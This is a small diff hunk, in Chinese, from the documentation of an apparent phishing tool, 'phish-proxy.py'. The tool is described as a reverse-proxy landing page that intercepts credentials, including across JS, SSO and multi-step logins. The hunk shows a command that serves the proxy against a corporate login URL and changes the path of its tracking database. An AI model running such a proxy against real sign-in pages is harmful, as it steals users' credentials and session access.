@@ -18,7 +18,7 @@ description: 反向代理着陆页 v2——处理 JS/SSO/多步登录/凭据拦�
 ```bash
 phish-proxy.py serve --listen 0.0.0.0:80 \
     --target https://login.target-corp.com \
-    --db /tmp/phish-track.json
+    --db <数据根>/tools/phish/track.json(缺省即此, 通常无需显式传)
 ```
 
 ## 核心行为
